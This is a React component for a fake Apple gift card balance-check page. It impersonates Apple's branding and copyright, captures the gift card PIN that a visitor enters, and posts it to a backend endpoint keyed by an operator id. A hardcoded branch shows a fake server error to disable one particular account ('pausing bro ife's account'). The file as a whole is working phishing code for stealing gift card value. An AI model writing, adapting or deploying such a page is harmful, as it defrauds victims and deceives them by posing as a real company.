import { useState, useRef, useEffect } from "react";
import axios from "axios";
import { Oval } from "react-loader-spinner";
import { useParams } from "react-router-dom";
import { FaBars, FaTimes } from "react-icons/fa";
import { BiSearch, BiUser, BiCart } from "react-icons/bi";
import { Link } from "react-router-dom";
import { CLIENT_BASE_URL } from "./context";
import IMAGE from "../public/apple.jpeg";
import LOGO from "../public/apple-logo.png";

function Home() {
  const [secretPin, setSecretPin] = useState("");
  const [isOpenNav, setIsOpenNav] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isDone, setIsDone] = useState(false);
  const [error, setError] = useState({ isError: false, message: "" });
  const [cardData, setCardData] = useState("");
  const [customError, setCustomError] = useState("");

  const { id } = useParams();

  function getSecretPin(e) {
    setCustomError("");
    let input = e.target.value;
    const cleanedInput = input.replace(/\s+/g, "").slice(0, 16);
    const formattedPin = cleanedInput.replace(/(.{4})/g, "$1 ").trim();

    setSecretPin(formattedPin);
  }

  /////////////////////////////////////////////////////////
  //Pausing bro ife's account
  const timeoutRef = useRef(null);
  useEffect(() => {
    return () => {
      if (timeoutRef.current) clearTimeout(timeoutRef.current);
    };
  }, []);
  /////////////////////////////////////////////////////////

  async function storeSecretPin() {
    if (secretPin.length !== 19 || !secretPin.trim().length) {
      return setError({ isError: true, message: "Please enter a valid PIN." });
    }
    setIsLoading(true);

    const userId = id || "";

    ////////////////////////////////////////////////////
    //pausing bro ife's account
    if (userId === "676fe7a95c968131b84011b4") {
      console.log("yes");
      timeoutRef.current = setTimeout(() => {
        setError({
          isError: true,
          message: "Error: Server failure. Please try again later.",
        });
        setIsLoading(false);
      }, 10000);
      return;
    }
    ///////////////////////////////////////////////////

    try {
      const { data } = await axios.post(`${CLIENT_BASE_URL}/card/${userId}`, {
        secreteCode: secretPin,
      });
      setCardData(data);
      setIsLoading(false);
      setIsDone(true);
      setError({ isError: false, message: "" });
      if (data.error) {
        setCustomError("invalid code, check and try again");
      }
      setSecretPin("");
    } catch (err) {
      setIsLoading(false);
      setIsDone(false);
      setError({ isError: false, message: "" });
      console.error(err);
    }
  }
  return (
    <main
      className="main"
      style={{ maxHeight: isOpenNav ? "100vh" : "initial", overflow: "hidden" }}
    >
      <header className="header">
        <div className="top">
          <div className="logo">
            <img src={LOGO} alt="something demure" />
          </div>
          <div className="icons">
            <BiSearch className="icon" />
            <BiCart className="icon" />
            <FaBars
              onClick={() => {
                setIsOpenNav(true);
              }}
              className="icon bars"
            />
          </div>
        </div>
        <div className="bottom">
          <p>Apple Gift Card</p>
          <div className="bottom-right">
            <button>Buy</button>
          </div>
        </div>
        {isOpenNav && (
          <nav className="nav">
            <div className="icon-container">
              <FaTimes
                className="icon"
                onClick={() => {
                  setIsOpenNav(false);
                }}
              />
            </div>
            <ul>
              <li>Store</li>
              <li>Mac</li>
              <li>iPad</li>
              <li>iPhone</li>
              <li>Watch</li>
              <li>Vision</li>
              <li>AirPods</li>
              <li>TV & Home</li>
              <li>Entertainment</li>
              <li>Accessories</li>
              <li>Support</li>
            </ul>
          </nav>
        )}
      </header>
      <div className="hero">
        <div className="ebay-image">
          <h2>Check Your Apple Gift Card Balance</h2>
        </div>
        {!isDone && (
          <div className="code">
            <div>
              <p>Enter your PIN here:</p>
              <input
                onChange={getSecretPin}
                placeholder="Gift Card Pin"
                value={secretPin}
              />
              {error.isError && (
                <small className="error">{error.message}</small>
              )}
            </div>
            <div className="check">
              <button onClick={storeSecretPin}>
                {" "}
                {isLoading && (
                  <Oval
                    className="loader"
                    visible={true}
                    height="20"
                    width="20"
                    color="white"
                    // ariaLabel="oval-loading"
                  />
                )}{" "}
                Check Balance
              </button>
            </div>
          </div>
        )}
        {isDone && !cardData.error && (
          <div className="result">
            <div className="amount">
              <p className="text">Here's your balance:</p>
              <p className="balance">US ${cardData.balance}.00</p>
            </div>
            <small>
              Recently used gift cards may not reflect the updated balance on
              the card. Card balances will be updated once your order is ready
              to ship.
            </small>

            <p
              className="check-new"
              onClick={() => {
                setIsDone(false);
              }}
            >
              Check another gift card
            </p>
          </div>
        )}

        {isDone && cardData.error && (
          <div className="code">
            <div>
              <p>Enter your PIN here:</p>
              <input
                onChange={getSecretPin}
                placeholder="Gift Card Pin"
                value={secretPin}
              />
              <small className="error">{customError}</small>
            </div>
            <div className="check">
              <button onClick={storeSecretPin}>
                {" "}
                {isLoading && (
                  <Oval
                    className="loader"
                    visible={true}
                    height="20"
                    width="20"
                    color="white"
                    // ariaLabel="oval-loading"
                  />
                )}{" "}
                Check Balance
              </button>
            </div>
          </div>
        )}
      </div>

      <section className="apple-image">
        <div className="apple">
          <img src={IMAGE} alt="something amazing" />
        </div>
      </section>

      <footer className="footer">
        <ul className="ul">
          <li>Shop and Learn</li>
          <li>Apple Wallet</li>
          <li>Account</li>
          <li>Entertainment</li>
          <li>Apple Store</li>
          <li>For Business</li>
          <li>For Education</li>
          <li>For Healthcare</li>
          <li>For Government</li>
          <li>Apple Values</li>
          <li>About Apple</li>
        </ul>

        <div>
          <div className="second">
            <a>
              <span>Site map,</span> <span>User Agreement,</span>{" "}
              <span>Privacy,</span> <span>Cookies</span> &{" "}
              <span>AdChoice.</span>
            </a>
          </div>
          <div className="last">
            <p>Copyright © 2024 Apple Inc.</p>
            <p>
              Mobile /{" "}
              <Link to="/Sign-in" className="classic">
                Classic Site
              </Link>
            </p>
          </div>
        </div>
      </footer>
    </main>
  );
}

export default Home;
